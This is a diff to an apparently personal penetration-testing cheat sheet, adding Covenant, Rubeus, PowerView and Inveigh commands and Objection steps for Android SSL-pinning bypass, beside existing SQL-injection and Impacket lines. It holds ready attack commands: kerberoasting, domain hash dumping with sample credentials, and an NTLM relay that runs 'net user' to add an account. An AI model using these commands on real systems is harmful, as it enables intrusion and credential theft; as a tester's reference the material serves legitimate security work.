@@ -343,6 +343,32 @@ IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)
 
 ### Covenant
 
+```bash
+
+# Commands
+ImpersonateProcess 1776
+ImpersonateProcess <PID>
+
+# Rubeus
+- Rubeus kerberoast admin hashcat
+- Rubeus klist
+
+
+# Import Powershell
+- PowerShellImport 
+- Choose file
+
+
+# Powerview.ps1
+- Powershell Get-DomainUser -TrustedToAuth
+
+
+# Inveigh
+- Powershell Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! /add" -Attack Enumerate,Execute,Session
+- Powershell Invoke-Inveigh -ConsoleOutput Y
+
+```
+
 ### Impacket Tools
 
 ```bash
@@ -355,6 +381,24 @@ GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outpu
 # secretsdump.py
 secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
 ```
+
+### Objection
+
+```bash
+# Install 
+pip3 install -U objection 
+
+# Commands (Step By Step) 
+- objection patchapk --source base.apk 
+- adb install base.objection.apk 
+- objection explore (Make sure to open the application first in our mobile phone before run) 
+	* android sslpinning disable 
+
+# References 
+- https://gowthamr1.medium.com/android-ssl-pinning-bypass-using-objection-and-frida-scripts-f8199571e7d8 
+- https://github.com/sensepost/objection/tree/master/objection/console/helpfiles
+```
+
 
 # C. SUID/CAP/SUDO/GROUP
 
